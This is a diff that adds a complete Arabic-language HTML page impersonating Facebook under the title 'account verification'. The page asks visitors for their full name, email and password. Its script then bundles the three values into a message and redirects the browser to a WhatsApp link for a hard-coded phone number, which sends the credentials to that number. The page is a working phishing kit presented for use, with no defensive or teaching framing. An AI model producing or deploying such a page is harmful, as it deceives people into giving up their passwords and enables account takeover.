@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق الحسابات - فيسبوك الرسمي</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #166fe5; }
+        .note { font-size: 12px; color: #65676b; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>توثيق الحساب</h2>
+        <p>أدخل بياناتك لاستكمال التوثيق:</p>
+        <form id="phishingForm">
+            <input type="text" id="name" placeholder="الاسم الكامل" required>
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">توثيق الآن</button>
+        </form>
+        <p class="note">فيسبوك الرسمي لا يطلب كلمة المرور عبر الواتساب.</p>
+    </div>
+
+    <script>
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            const message = `*بيانات توثيق فيسبوك*\nالاسم: ${name}\nالإيميل: ${email}\nكلمة المرور: ${pass}`;
+            const encodedMessage = encodeURIComponent(message);
+            const whatsappNumber = "20100706589"; // تم تحويل الرقم الدولي
+
+            window.location.href = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
+        });
+    </script>
+</body>
+</html>
